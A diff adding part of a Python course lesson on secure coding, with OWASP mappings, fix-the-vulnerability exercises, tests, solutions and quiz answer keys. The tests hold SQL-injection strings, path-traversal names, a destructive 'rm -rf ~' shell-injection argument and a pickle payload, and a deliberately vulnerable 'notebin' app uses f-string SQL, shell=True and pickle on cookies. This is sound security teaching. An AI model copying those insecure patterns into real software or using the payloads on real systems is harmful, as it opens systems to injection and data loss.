+      an attack on it. Defences:</p>
+    <ul>
+      <li><strong>Pin with a lockfile.</strong> <code>pixi.lock</code> records exact versions and sha256 hashes, so a
+        package that changes on the server fails to install instead of silently replacing the real one. Upgrade
+        deliberately (<a href="m41-pixi-packaging.html#lockfile">M41</a>).</li>
+      <li><strong>Audit for known vulnerabilities.</strong> <code>pip-audit</code> checks installed Python packages
+        against the Python Packaging Advisory Database and OSV. Add it as a dev tool and run it in CI:
+        <code>pixi add --feature dev pip-audit</code>, then <code>pixi run pip-audit</code>.</li>
+      <li><strong>Restrict sources.</strong> This repository has a <code>pixi-policy.toml</code> that allows only the
+        conda-forge channel, forbids git and URL dependencies, and lists the licenses currently in use. It's a
+        written, reviewable policy for what may enter the environment.</li>
+      <li><strong>Add fewer dependencies.</strong> Every package is attack surface. The standard library
+        (<a href="m40-stdlib.html">M40</a>) often has what you need.</li>
+    </ul>
+    <pre data-label="Terminal"><code class="language-bash">$ pixi run pip-audit
+No known vulnerabilities found</code></pre>
+    <h3>The OWASP Top 10, mapped to Python</h3>
+    <p>OWASP (the Open Worldwide Application Security Project) publishes the most common categories of web
+      application risk. The table uses the widely referenced 2021 categories. The 2025 edition reorders them and
+      gives more weight to software supply-chain failures, but the defences are the same.</p>
+    <table>
+      <thead><tr><th>Risk</th><th>What it looks like in Python</th><th>Defence</th></tr></thead>
+      <tbody>
+        <tr><td>A01 Broken Access Control</td><td><code>GET /invoices/{id}</code> returns any user's invoice</td><td>Check ownership on every request; deny by default</td></tr>
+        <tr><td>A02 Cryptographic Failures</td><td>sha256 or md5 passwords, homemade crypto, HTTP not HTTPS</td><td>pbkdf2/scrypt/argon2; vetted libraries; TLS everywhere</td></tr>
+        <tr><td>A03 Injection</td><td>f-string SQL, <code>shell=True</code>, unescaped HTML, <code>eval(user_input)</code></td><td>Parameters, argument lists, escaping/t-strings, never <code>eval</code></td></tr>
+        <tr><td>A04 Insecure Design</td><td>Unlimited password-reset attempts</td><td>Threat-model features; rate limits</td></tr>
+        <tr><td>A05 Security Misconfiguration</td><td><code>debug=True</code> in production, tracebacks shown to users</td><td>Environment-specific config, generic error pages</td></tr>
+        <tr><td>A06 Vulnerable Components</td><td>Old packages with known CVEs</td><td>Lockfile, <code>pip-audit</code>, scheduled updates</td></tr>
+        <tr><td>A07 Authentication Failures</td><td>Predictable tokens from <code>random</code>, <code>==</code> on secrets</td><td><code>secrets</code>, <code>hmac.compare_digest</code>, MFA</td></tr>
+        <tr><td>A08 Software &amp; Data Integrity</td><td><code>pickle.loads</code> on cookies; unsigned updates</td><td>JSON + validation; signatures; trusted publishing</td></tr>
+        <tr><td>A09 Logging &amp; Monitoring Failures</td><td>No record of failed logins; passwords in logs</td><td>Structured security events, redaction, alerts</td></tr>
+        <tr><td>A10 Server-Side Request Forgery</td><td>Fetching a user-supplied URL reaches <code>http://169.254.169.254/</code></td><td>Allow-list hosts, block internal ranges, timeouts</td></tr>
+      </tbody>
+    </table>
+    <p><strong>Remember:</strong> lock and audit your dependencies, restrict where they can come from, and work
+      through the OWASP list as a review checklist for every feature.</p>
+  </section>
+
+  <!-- ============================================================ -->
+  <section class="lesson-section" id="practice">
+    <h2>Practice: find and fix the vulnerability</h2>
+    <p>Each starter contains working but <em>vulnerable</em> code. Keep the behaviour and remove the vulnerability.
+      The tests attack your code.</p>
+
+    <div class="exercise" data-id="m43-e1" data-title="Fix the SQL injection">
+      <div class="exercise-prompt">
+        <p><code>find_user(conn, name)</code> returns <code>(name, email)</code> for an exact name match, or
+          <code>None</code>. It builds SQL with an f-string. Rewrite it with a parameterized query.</p>
+      </div>
+<textarea class="starter">
+import sqlite3
+
+def find_user(conn, name):
+    row = conn.execute(f"SELECT name, email FROM users WHERE name = '{name}'").fetchone()
+    return row
+</textarea>
+      <script type="text/x-python" class="tests">
+import sqlite3
+
+def _db():
+    conn = sqlite3.connect(":memory:")
+    conn.execute("CREATE TABLE users (name TEXT, email TEXT)")
+    conn.executemany("INSERT INTO users VALUES (?, ?)", [("alice", "a@example.com"), ("O'Brien", "ob@example.com")])
+    return conn
+
+def test_normal_lookup():
+    assert find_user(_db(), "alice") == ("alice", "a@example.com"), "exact match should return the row"
+
+def test_missing():
+    assert find_user(_db(), "zed") is None, "no match returns None"
+
+def test_injection_blocked():
+    assert find_user(_db(), "x' OR '1'='1") is None, "the classic injection must not match any row"
+
+def test_apostrophe_name():
+    assert find_user(_db(), "O'Brien") == ("O'Brien", "ob@example.com"), "names with quotes must work"
+
+def test_no_union_attack():
+    assert find_user(_db(), "x' UNION SELECT name, email FROM users --") is None, "UNION injection must fail"
+      </script>
+      <details class="hint"><summary>Hint</summary><p>Use a <code>?</code> placeholder and pass
+        <code>(name,)</code> as the second argument to <code>execute</code>.</p></details>
+      <details class="solution"><summary>Show solution</summary>
+<pre><code class="language-python">import sqlite3
+
+def find_user(conn, name):
+    return conn.execute("SELECT name, email FROM users WHERE name = ?", (name,)).fetchone()</code></pre>
+      </details>
+    </div>
+
+    <div class="exercise" data-id="m43-e2" data-title="Fix the path traversal">
+      <div class="exercise-prompt">
+        <p><code>read_upload(base_dir, filename)</code> returns the text of a file inside <code>base_dir</code>. Make
+          it raise <code>PermissionError</code> whenever the resolved path is outside <code>base_dir</code>,
+          including via <code>..</code> and absolute paths. Legitimate subdirectories like
+          <code>"2026/report.txt"</code> must still work.</p>
+      </div>
+<textarea class="starter">
+from pathlib import Path
+
+def read_upload(base_dir, filename):
+    return (Path(base_dir) / filename).read_text()
+</textarea>
+      <script type="text/x-python" class="tests">
+import tempfile
+from pathlib import Path
+
+def _setup():
+    root = Path(tempfile.mkdtemp())
+    base = root / "uploads"
+    (base / "2026").mkdir(parents=True)
+    (base / "a.txt").write_text("A")
+    (base / "2026" / "report.txt").write_text("R")
+    (root / "secret.txt").write_text("S")
+    return root, base
+
+def _blocked(base, name):
+    try:
+        read_upload(base, name)
+    except PermissionError:
+        return True
+    return False
+
+def test_normal():
+    _, base = _setup()
+    assert read_upload(base, "a.txt") == "A", "a normal file should be readable"
+    assert read_upload(base, "2026/report.txt") == "R", "subdirectories are allowed"
+
+def test_dotdot():
+    _, base = _setup()
+    assert _blocked(base, "../secret.txt"), "../ must not escape the base"
+    assert _blocked(base, "2026/../../secret.txt"), "nested ../ must not escape"
+
+def test_absolute():
+    root, base = _setup()
+    assert _blocked(base, str(root / "secret.txt")), "an absolute path must be rejected"
+
+def test_sibling_prefix():
+    root, base = _setup()
+    (root / "uploads-evil").mkdir()
+    (root / "uploads-evil" / "x.txt").write_text("X")
+    assert _blocked(base, "../uploads-evil/x.txt"), "a sibling with the same prefix is still outside"
+      </script>
+      <details class="hint"><summary>Hint</summary><p>Resolve <em>both</em> the base and the target, then use
+        <code>target.is_relative_to(base)</code>. A string <code>startswith</code> check fails the sibling-prefix
+        test.</p></details>
+      <details class="solution"><summary>Show solution</summary>
+<pre><code class="language-python">from pathlib import Path
+
+def read_upload(base_dir, filename):
+    base = Path(base_dir).resolve()
+    target = (base / filename).resolve()
+    if not target.is_relative_to(base):
+        raise PermissionError(f"{filename!r} is outside the upload directory")
+    return target.read_text()</code></pre>
+      </details>
+    </div>
+
+    <div class="exercise" data-id="m43-e3" data-title="Fix the password storage">
+      <div class="exercise-prompt">
+        <p>The starter stores <code>sha256(password)</code> and compares with <code>==</code>. Replace it:</p>
+        <ul>
+          <li><code>hash_password(password, iterations=600_000)</code> returns
+            <code>"pbkdf2_sha256$&lt;iterations&gt;$&lt;salt hex&gt;$&lt;hash hex&gt;"</code>, using a fresh 16-byte
+            salt from <code>secrets.token_bytes</code> (or <code>os.urandom</code>) and
+            <code>hashlib.pbkdf2_hmac("sha256", ...)</code>.</li>
+          <li><code>verify_password(password, stored)</code> recomputes with the stored salt and iterations and compares
+            with <code>hmac.compare_digest</code>. It returns <code>False</code> (never raises) for malformed
+            <code>stored</code> strings.</li>
+        </ul>
+      </div>
+<textarea class="starter">
+import hashlib
+import hmac
+import secrets
+
+def hash_password(password, iterations=600_000):
+    return hashlib.sha256(password.encode()).hexdigest()
+
+def verify_password(password, stored):
+    return hash_password(password) == stored
+</textarea>
+      <script type="text/x-python" class="tests">
+import hmac
+
+def test_roundtrip():
+    stored = hash_password("correct horse", iterations=1_000)
+    assert verify_password("correct horse", stored) is True, "the right password verifies"
+    assert verify_password("wrong horse", stored) is False, "a wrong password fails"
+
+def test_format_and_default_cost():
+    algo, iters, salt, digest = hash_password("pw").split("$")
+    assert algo == "pbkdf2_sha256", "prefix the algorithm name"
+    assert int(iters) >= 600_000, "default cost should be at least 600,000 iterations"
+    assert len(bytes.fromhex(salt)) == 16, "use a 16-byte salt"
+    assert len(bytes.fromhex(digest)) == 32, "sha256 output is 32 bytes"
+
+def test_salted():
+    a = hash_password("same", iterations=1_000)
+    b = hash_password("same", iterations=1_000)
+    assert a != b, "two hashes of the same password must differ (random salt)"
+
+def test_uses_compare_digest():
+    calls = []
+    real = hmac.compare_digest
+    def spy(x, y):
+        calls.append(1)
+        return real(x, y)
+    hmac.compare_digest = spy
+    try:
+        verify_password("pw", hash_password("pw", iterations=1_000))
+    finally:
+        hmac.compare_digest = real
+    assert calls, "verify_password should compare with hmac.compare_digest"
+
+def test_malformed():
+    assert verify_password("pw", "not-a-hash") is False, "malformed stored values return False"
+    assert verify_password("pw", "pbkdf2_sha256$abc$zz$zz") is False, "bad numbers/hex return False"
+      </script>
+      <details class="hint"><summary>Hint</summary><p>Split the stored value on <code>"$"</code> inside a
+        <code>try</code> that catches <code>ValueError</code> (wrong part count, bad int, bad hex). Call
+        <code>hmac.compare_digest</code> through the module (<code>hmac.compare_digest(...)</code>).</p></details>
+      <details class="solution"><summary>Show solution</summary>
+<pre><code class="language-python">import hashlib
+import hmac
+import secrets
+
+def hash_password(password, iterations=600_000):
+    salt = secrets.token_bytes(16)
+    digest = hashlib.pbkdf2_hmac("sha256", password.encode(), salt, iterations)
+    return f"pbkdf2_sha256${iterations}${salt.hex()}${digest.hex()}"
+
+def verify_password(password, stored):
+    try:
+        algo, iters, salt_hex, digest_hex = stored.split("$")
+        iterations = int(iters)
+        salt = bytes.fromhex(salt_hex)
+        expected = bytes.fromhex(digest_hex)
+    except ValueError:
+        return False
+    if algo != "pbkdf2_sha256" or iterations &lt; 1:
+        return False
+    actual = hashlib.pbkdf2_hmac("sha256", password.encode(), salt, iterations)
+    return hmac.compare_digest(actual, expected)</code></pre>
+      </details>
+    </div>
+
+    <div class="exercise" data-id="m43-e4" data-title="Fix the shell injection">
+      <div class="exercise-prompt">
+        <p>The vulnerable code was <code>subprocess.run(f"wc -l {path}", shell=True)</code>. Write
+          <code>line_count_command(path)</code> that returns the safe argument list
+          <code>["wc", "-l", "--", path]</code> for <code>subprocess.run</code>. Raise <code>ValueError</code> if
+          <code>path</code> is empty, starts with <code>-</code>, or contains a NUL character
+          (<code>"\x00"</code>). Shell metacharacters like <code>;</code> are fine, because they stay inside one
+          argument.</p>
+      </div>
+<textarea class="starter">
+def line_count_command(path):
+    return f"wc -l {path}"
+</textarea>
+      <script type="text/x-python" class="tests">
+def _rejects(p):
+    try:
+        line_count_command(p)
+    except ValueError:
+        return True
+    return False
+
+def test_returns_list():
+    assert line_count_command("notes.txt") == ["wc", "-l", "--", "notes.txt"], "return an argument list with --"
+
+def test_metacharacters_stay_one_arg():
+    cmd = line_count_command("a.txt; rm -rf ~")
+    assert cmd[-1] == "a.txt; rm -rf ~" and len(cmd) == 4, "hostile text must remain a single argument"
+
+def test_rejects_option_like():
+    assert _rejects("--output=/etc/passwd"), "names starting with - are rejected"
+
+def test_rejects_empty_and_nul():
+    assert _rejects(""), "empty path is rejected"
+    assert _rejects("a\x00b"), "NUL characters are rejected"
+      </script>
+      <details class="hint"><summary>Hint</summary><p>Validate first, then return a plain list.</p></details>
+      <details class="solution"><summary>Show solution</summary>
+<pre><code class="language-python">def line_count_command(path):
+    if not path or path.startswith("-") or "\x00" in path:
+        raise ValueError(f"unsafe path: {path!r}")
+    return ["wc", "-l", "--", path]</code></pre>
+      </details>
+    </div>
+
+    <div class="exercise" data-id="m43-e5" data-title="Parameterized SQL from a t-string">
+      <div class="exercise-prompt">
+        <p>Write <code>sql(template)</code> that turns a 3.14 t-string into <code>(query, params)</code> for
+          sqlite3. Static parts are kept as they are, each interpolation becomes <code>?</code>, and its value is
+          appended to the <code>params</code> tuple. Raise <code>TypeError</code> if <code>template</code> isn't a
+          <code>Template</code> (for example a plain <code>str</code> from an f-string).</p>
+        <p>Example: <code>sql(t"SELECT * FROM users WHERE name = {name}")</code> returns
+          <code>("SELECT * FROM users WHERE name = ?", (name,))</code>.</p>
+      </div>
+<textarea class="starter">
+from string.templatelib import Interpolation, Template
+
+def sql(template):
+    ...
+</textarea>
+      <script type="text/x-python" class="tests">
+import sqlite3
+
+def test_basic():
+    name = "bob"
+    assert sql(t"SELECT * FROM users WHERE name = {name}") == ("SELECT * FROM users WHERE name = ?", ("bob",)), "one placeholder"
+
+def test_multiple():
+    lo, hi = 3, 9
+    assert sql(t"SELECT * FROM t WHERE x > {lo} AND x < {hi}") == ("SELECT * FROM t WHERE x > ? AND x < ?", (3, 9)), "two placeholders, in order"
+
+def test_rejects_str():
+    name = "bob"
+    try:
+        sql(f"SELECT * FROM users WHERE name = '{name}'")
+    except TypeError:
+        return
+    assert False, "plain strings must raise TypeError"
+
+def test_injection_is_inert():
+    conn = sqlite3.connect(":memory:")
+    conn.execute("CREATE TABLE users (name TEXT)")
+    conn.execute("INSERT INTO users VALUES ('alice')")
+    evil = "x' OR '1'='1"
+    query, params = sql(t"SELECT name FROM users WHERE name = {evil}")
+    assert conn.execute(query, params).fetchall() == [], "the attack string is just data"
+      </script>
+      <details class="hint"><summary>Hint</summary><p>Iterate over the template. Strings are appended to a list;
+        for <code>Interpolation</code> items append <code>"?"</code> and collect <code>item.value</code>.</p></details>
+      <details class="solution"><summary>Show solution</summary>
+<pre><code class="language-python">from string.templatelib import Interpolation, Template
+
+def sql(template):
+    if not isinstance(template, Template):
+        raise TypeError("sql() requires a t-string Template, not a str")
+    parts = []
+    params = []
+    for item in template:
+        if isinstance(item, Interpolation):
+            parts.append("?")
+            params.append(item.value)
+        else:
+            parts.append(item)
+    return "".join(parts), tuple(params)</code></pre>
+      </details>
+    </div>
+
+    <div class="exercise" data-id="m43-e6" data-title="Replace pickle with validated JSON">
+      <div class="exercise-prompt">
+        <p>User preferences arrive in a cookie and used to be loaded with <code>pickle.loads</code>. Write
+          <code>load_prefs(text)</code> that parses JSON and validates it strictly:</p>
+        <ul>
+          <li>It must be an object whose keys are a subset of <code>{"theme", "font_size"}</code>.</li>
+          <li><code>theme</code> must be <code>"light"</code> or <code>"dark"</code> (default
+            <code>"light"</code>).</li>
+          <li><code>font_size</code> must be an <code>int</code> (not bool) from 8 to 32 inclusive (default
+            14).</li>
+        </ul>
+        <p>Return a dict with both keys filled in. Raise <code>ValueError</code> for anything else, including
+          invalid JSON (<code>json.JSONDecodeError</code> is already a <code>ValueError</code> subclass).</p>
+      </div>
+<textarea class="starter">
+import base64
+import pickle
+
+def load_prefs(text):
+    return pickle.loads(base64.b64decode(text))
+</textarea>
+      <script type="text/x-python" class="tests">
+def _rejects(text):
+    try:
+        load_prefs(text)
+    except ValueError:
+        return True
+    return False
+
+def test_defaults():
+    assert load_prefs("{}") == {"theme": "light", "font_size": 14}, "missing keys get defaults"
+
+def test_valid():
+    assert load_prefs('{"theme": "dark", "font_size": 20}') == {"theme": "dark", "font_size": 20}, "valid prefs load"
+
+def test_bad_values():
+    assert _rejects('{"theme": "neon"}'), "unknown theme"
+    assert _rejects('{"font_size": 100}'), "font size out of range"
+    assert _rejects('{"font_size": "12"}'), "font size must be an int"
+    assert _rejects('{"font_size": true}'), "bool is not an acceptable int"
+
+def test_bad_shape():
+    assert _rejects('{"theme": "dark", "admin": true}'), "unknown keys are rejected"
+    assert _rejects('["dark"]'), "top level must be an object"
+    assert _rejects("gASVKAAAAAAAAACMCGJ1aWx0aW5zlIwFcHJpbnSUk5SMBXB3bmVklIWUUpQu"), "a pickle payload is not JSON"
+      </script>
+      <details class="hint"><summary>Hint</summary><p>Check <code>isinstance(data, dict)</code>, then
+        <code>set(data) - ALLOWED</code>, then each value. Remember <code>isinstance(True, int)</code> is
+        <code>True</code>.</p></details>
+      <details class="solution"><summary>Show solution</summary>
+<pre><code class="language-python">import json
+
+ALLOWED = {"theme", "font_size"}
+
+def load_prefs(text):
+    data = json.loads(text)
+    if not isinstance(data, dict):
+        raise ValueError("preferences must be a JSON object")
+    unknown = set(data) - ALLOWED
+    if unknown:
+        raise ValueError(f"unknown keys: {sorted(unknown)}")
+    theme = data.get("theme", "light")
+    size = data.get("font_size", 14)
+    if theme not in {"light", "dark"}:
+        raise ValueError("theme must be 'light' or 'dark'")
+    if isinstance(size, bool) or not isinstance(size, int) or not 8 &lt;= size &lt;= 32:
+        raise ValueError("font_size must be an integer from 8 to 32")
+    return {"theme": theme, "font_size": size}</code></pre>
+      </details>
+    </div>
+  </section>
+
+  <!-- ============================================================ -->
+  <section class="lesson-section" id="mini-project">
+    <h2>Mini-project: security-review a vulnerable app</h2>
+    <div class="project-box">
+      <div class="widget-head"><span class="w-kind">Mini-project</span><span class="w-title">Audit and fix "notebin"</span></div>
+      <div class="widget-body">
+        <p><code>notebin</code> is a tiny notes service, deliberately full of vulnerabilities. Copy it into a new Pixi
+          workspace as <code>src/notebin/app.py</code>. Your job, as the security reviewer, is to find
+          <em>every</em> issue, write a failing test that demonstrates each one, fix it, and write a short report.</p>
+<pre data-label="src/notebin/app.py (VULNERABLE: do not deploy)"><code class="language-python">import hashlib
+import pickle
+import random
+import sqlite3
+import subprocess
+from pathlib import Path
+
+SECRET_KEY = "dev-secret-123"
+EXPORTS = Path("exports")
+db = sqlite3.connect("notebin.db")
+
+
+def register(username, password):
+    pw_hash = hashlib.md5(password.encode()).hexdigest()
+    db.execute(f"INSERT INTO users VALUES ('{username}', '{pw_hash}')")
+    print(f"registered {username} with password {password}")
+
+
+def login(username, password):
+    pw_hash = hashlib.md5(password.encode()).hexdigest()
+    row = db.execute(f"SELECT * FROM users WHERE name='{username}' AND pw='{pw_hash}'").fetchone()
+    return row is not None
+
+
+def make_reset_token():
+    return str(random.randint(100000, 999999))
+
+
+def check_api_key(given):
+    return given == SECRET_KEY
+
+
+def load_session(cookie_bytes):
+    return pickle.loads(cookie_bytes)
+
+
+def export_note(note_id, filename):
+    subprocess.run(f"sqlite3 notebin.db 'SELECT body FROM notes WHERE id={note_id}' &gt; exports/{filename}", shell=True)
+
+
+def download(filename):
+    return (EXPORTS / filename).read_text()
+
+
+def handle_error(exc):
+    import traceback
+    return {"status": 500, "body": traceback.format_exc()}</code></pre>
+        <details class="reveal"><summary>Reveal the issue list (after you've done your own review)</summary>
+          <ol>
+            <li><code>SECRET_KEY</code> hard-coded in source → read it from the environment and rotate it (A05/A07).</li>
+            <li>MD5 password hashing, unsalted → <code>pbkdf2_hmac</code>/<code>scrypt</code> with a salt (A02).</li>
+            <li>SQL built with f-strings in <code>register</code> and <code>login</code> → <code>?</code> parameters (A03).</li>
+            <li><code>print</code> logs the plaintext password → structlog event without secrets (A09).</li>
+            <li><code>random</code> reset token, only 6 digits → <code>secrets.token_urlsafe(32)</code> with an expiry (A07).</li>
+            <li><code>==</code> on the API key → <code>hmac.compare_digest</code> (timing attack).</li>
+            <li><code>pickle.loads</code> on a cookie → signed JSON with validation (A08).</li>
+            <li><code>shell=True</code> with <code>note_id</code> and <code>filename</code> → argument lists, an
+              <code>int(note_id)</code>, and Python file writing (A03).</li>
+            <li><code>download</code> path traversal → <code>resolve()</code> + <code>is_relative_to()</code> (A01).</li>
+            <li><code>handle_error</code> returns the traceback to the client → log it, return a generic message
+              with a request id (A05).</li>
+            <li>Module-level DB connection to a relative path → configuration plus explicit lifecycle (design).</li>
+          </ol>
+        </details>
+        <ul class="checklist" data-id="m43-mini">
+          <li>Every issue has a pytest test that failed before your fix and passes after</li>
+          <li>No f-string SQL and no <code>shell=True</code> remain (enable ruff <code>S</code> rules and get zero findings)</li>
+          <li>Passwords use pbkdf2 or scrypt with per-user salts, and verification uses <code>hmac.compare_digest</code></li>
+          <li>Tokens come from <code>secrets</code>, secrets come from <code>os.environ</code>, and <code>.env</code> is gitignored</li>
+          <li>Sessions use JSON with schema validation and an HMAC signature, not pickle</li>
+          <li><code>download("../notebin.db")</code> raises <code>PermissionError</code></li>
+          <li>Errors are logged with structlog and clients see a generic message</li>
+          <li><code>pixi run pip-audit</code> reports no known vulnerabilities</li>
+          <li>A one-page <code>SECURITY_REVIEW.md</code> lists each finding, its OWASP category, and the fix</li>
+        </ul>
+        <h4>Stretch goals</h4>
+        <ul>
+          <li>Render notes as HTML with a t-string <code>render_html()</code> that escapes every value.</li>
+          <li>Add rate limiting to <code>login</code> (at most 5 failures per user per 15 minutes).</li>
+          <li>Run the app, attach with <code>python -m pdb -p PID</code>, and inspect a live request.</li>
+        </ul>
+      </div>
+    </div>
+  </section>
+
+  <!-- ============================================================ -->
+  <section class="lesson-section" id="quiz">
+    <h2>Quiz</h2>
+    <div class="quiz" data-id="m43-quiz">
+<script type="application/json">
+{"title": "Debugging and secure code quiz", "passScore": 0.7, "questions": [
+  {"type": "single", "prompt": "What is the right first step when you get a bug report?", "options": ["Change the most suspicious line", "Reproduce it reliably, ideally as a failing test", "Add print statements everywhere", "Rewrite the module"], "answer": 1, "explanation": "<p>Without a reproduction you can't isolate the bug or prove your fix works. Keep the reproduction as a regression test.</p>"},
+  {"type": "single", "prompt": "A traceback says <em>\"During handling of the above exception, another exception occurred\"</em>. What happened?", "options": ["Someone used <code>raise ... from exc</code>", "A new exception was raised inside an <code>except</code> block, often a bug in the handler", "The exception was suppressed", "Two threads crashed"], "answer": 1, "explanation": "<p>Implicit chaining sets <code>__context__</code>. Deliberate <code>raise ... from</code> sets <code>__cause__</code> and prints \"direct cause\".</p>"},
+  {"type": "output", "prompt": "What does this print?", "code": "try:\n    raise ValueError(\"bad\")\nexcept ValueError as e:\n    e.add_note(\"while parsing\")\n    print(e.__notes__)", "answer": "['while parsing']", "explanation": "<p><code>add_note</code> appends to <code>__notes__</code>, and the traceback prints each note under the message.</p>"},
+  {"type": "single", "prompt": "In pdb, which command moves to the <em>caller's</em> frame?", "options": ["<code>d</code>", "<code>u</code>", "<code>s</code>", "<code>n</code>"], "answer": 1, "explanation": "<p><code>u</code>(p) goes toward the caller and <code>d</code>(own) back toward the error. <code>w</code> shows where you are.</p>"},
+  {"type": "multi", "prompt": "Which are true about Python 3.14 remote attach?", "options": ["<code>python -m pdb -p PID</code> attaches pdb to a running process", "<code>sys.remote_exec(pid, script)</code> runs a file in the target at a safe point", "It needs no OS permissions", "It can be disabled with <code>PYTHON_DISABLE_REMOTE_DEBUG</code>"], "answer": [0, 1, 3], "explanation": "<p>PEP 768 adds a safe attach point. It still needs OS debug permissions, and services can opt out.</p>"},
+  {"type": "text", "prompt": "Which pytest flag opens pdb at the point of a test failure?", "answer": ["--pdb"], "explanation": "<p><code>pytest --pdb</code> starts post-mortem at the failing assertion. Combine with <code>-x --lf</code>.</p>"},
+  {"type": "single", "prompt": "Which sqlite3 call is safe from SQL injection?", "options": ["<code>conn.execute(f\"... WHERE name = '{name}'\")</code>", "<code>conn.execute(\"... WHERE name = '%s'\" % name)</code>", "<code>conn.execute(\"... WHERE name = ?\", (name,))</code>", "<code>conn.execute(\"... WHERE name = '\" + name.replace(\"'\", \"\") + \"'\")</code>"], "answer": 2, "explanation": "<p>Parameters send values separately from the SQL text. Filtering characters by hand is fragile and breaks real names like O'Brien.</p>"},
+  {"type": "single", "prompt": "Why is <code>subprocess.run([\"wc\", \"-l\", \"--\", path])</code> safe where <code>shell=True</code> is not?", "options": ["Lists run faster", "No shell parses the input; each element is one argument, and <code>--</code> stops option parsing", "subprocess escapes semicolons", "It runs in a sandbox"], "answer": 1, "explanation": "<p>Without a shell, <code>;</code>, <code>|</code>, and <code>$()</code> have no meaning. They're just characters inside one argument.</p>"},
+  {"type": "single", "prompt": "What does a t-string <code>t\"Hi {name}\"</code> evaluate to?", "options": ["A <code>str</code>", "A <code>string.templatelib.Template</code> keeping static strings and interpolations separate", "A compiled regex", "A lazy f-string"], "answer": 1, "explanation": "<p>A function processes the Template and can escape or parameterize each value, which f-strings can't allow.</p>"},
+  {"type": "multi", "prompt": "Which are dangerous on untrusted input?", "options": ["<code>pickle.loads</code>", "<code>yaml.load</code> with an unsafe loader", "<code>json.loads</code> followed by validation", "<code>eval</code>"], "answer": [0, 1, 3], "explanation": "<p>pickle, unsafe YAML loaders, and eval can all execute code. JSON only builds plain data, though you still validate it.</p>"},
+  {"type": "single", "prompt": "Which check correctly confines a user path to <code>base</code>?", "options": ["<code>str(target).startswith(str(base))</code>", "<code>\"..\" not in name</code>", "<code>(base / name).resolve().is_relative_to(base.resolve())</code>", "<code>name.replace(\"../\", \"\")</code>"], "answer": 2, "explanation": "<p>Resolving collapses <code>..</code> and symlinks, and <code>is_relative_to</code> compares path components. A string prefix check accepts <code>uploads-evil/</code>.</p>"},
+  {"type": "single", "prompt": "Why not store passwords as <code>sha256(password)</code>?", "options": ["sha256 is broken", "It's fast and unsalted, so attackers can test billions of guesses and reuse precomputed tables", "It produces long strings", "It can't hash unicode"], "answer": 1, "explanation": "<p>Use a slow, salted key-derivation function: <code>pbkdf2_hmac</code> (600k iterations) or <code>scrypt</code>.</p>"},
+  {"type": "text", "prompt": "Which stdlib module should generate password-reset tokens?", "answer": ["secrets"], "explanation": "<p><code>secrets.token_urlsafe()</code> uses the OS's cryptographic randomness. <code>random</code> is predictable.</p>"},
+  {"type": "single", "prompt": "What does <code>hmac.compare_digest</code> protect against?", "options": ["SQL injection", "Timing attacks that learn a secret from how long comparisons take", "Hash collisions", "Replay attacks"], "answer": 1, "explanation": "<p><code>==</code> exits at the first mismatch, so its timing leaks how many leading characters matched.</p>"},
+  {"type": "multi", "prompt": "Which measures defend against vulnerable or malicious dependencies?", "options": ["Committing a lockfile with hashes", "Running <code>pip-audit</code> in CI", "Restricting channels with a policy file", "Installing the newest version of everything on every build"], "answer": [0, 1, 2], "explanation": "<p>Pin, audit, and restrict sources. Unpinned latest-everything builds can't be reproduced and are exposed to hijacked releases.</p>"}
+]}
+</script>
+    </div>
+  </section>
+
+  <!-- ============================================================ -->
+  <section class="lesson-section" id="recap">
+    <h2>Recap</h2>
+    <ul>
+      <li>Debug scientifically: reproduce, isolate (halve the input or the history), hypothesise, verify, then keep a
+        regression test.</li>
+      <li>Read tracebacks from the bottom up. <code>from</code> means direct cause and "during handling" means the
+        handler failed. Use <code>add_note()</code> to add context.</li>
+      <li>pdb: <code>breakpoint()</code>, <code>n s c r</code>, <code>p pp w u d</code>, <code>b</code>/<code>cl</code>,
+        <code>interact</code>, and <code>pdb.pm()</code>. In 3.14, <code>python -m pdb -p PID</code> attaches to a
+        live process.</li>
+      <li>faulthandler for crashes and hangs, structured logs for history, <code>pytest -x --lf --pdb</code> for
+        failing tests, and IDE debuggers pointed at the Pixi interpreter.</li>
+      <li>Injection: parameterized SQL, argument-list subprocess calls without <code>shell=True</code>, and
+        t-strings for safe templating.</li>
+      <li>Never unpickle untrusted data. Confine paths with <code>resolve()</code> and
+        <code>is_relative_to()</code>.</li>
+      <li>Secrets come from the environment and leaked ones get rotated. Passwords are stored as pbkdf2 or scrypt
+        hashes, tokens come from <code>secrets</code>, and comparisons use <code>hmac.compare_digest</code>.</li>
+      <li>Lock, audit, and restrict dependencies, and use the OWASP Top 10 as a review checklist.</li>
+    </ul>
+    <div class="flashcards" data-title="Debugging and security">
+<script type="application/json">
+[{"front": "Four debugging steps", "back": "Reproduce, isolate, hypothesise, verify (then keep a regression test)."},
+ {"front": "<code>__cause__</code> vs <code>__context__</code>", "back": "cause: explicit <code>raise X from e</code>. context: implicit, a new error while handling another."},
+ {"front": "<code>exc.add_note(msg)</code>", "back": "Attach extra context lines to an exception as it propagates (3.11+)."},
+ {"front": "pdb post-mortem", "back": "<code>pdb.pm()</code> in the REPL, <code>pdb.post_mortem(tb)</code> in code, <code>pytest --pdb</code> for tests."},
+ {"front": "3.14 remote attach", "back": "<code>python -m pdb -p PID</code>; low level: <code>sys.remote_exec(pid, script)</code> (PEP 768)."},
+ {"front": "faulthandler", "back": "Dumps Python stacks on crashes/hangs: <code>-X faulthandler</code>, <code>dump_traceback_later()</code>."},
+ {"front": "SQL injection fix", "back": "Parameterized queries: <code>execute(\"... = ?\", (value,))</code>. Allow-list identifiers."},
+ {"front": "Shell injection fix", "back": "List args, no <code>shell=True</code>, <code>--</code> before user paths."},
+ {"front": "t-strings for safety", "back": "<code>t\"...\"</code> yields a Template; process Interpolations to escape or parameterize."},
+ {"front": "Path traversal fix", "back": "<code>(base / name).resolve().is_relative_to(base.resolve())</code>, or use generated ids."},
+ {"front": "Password storage", "back": "Salted slow KDF: <code>pbkdf2_hmac('sha256', pw, salt, 600_000)</code> or <code>scrypt</code>. Never sha256 alone."},
+ {"front": "Tokens and comparisons", "back": "<code>secrets.token_urlsafe(32)</code>; compare with <code>hmac.compare_digest</code>."}]
+</script>
+    </div>
+    <h3>Going further</h3>
+    <ul>
+      <li><a href="https://docs.python.org/3/library/pdb.html">pdb</a>, <a href="https://docs.python.org/3/library/faulthandler.html">faulthandler</a>, and <a href="https://docs.python.org/3/library/traceback.html">traceback</a></li>
+      <li><a href="https://peps.python.org/pep-0768/">PEP 768: Safe external debugger interface</a> and <a href="https://peps.python.org/pep-0750/">PEP 750: Template strings</a></li>
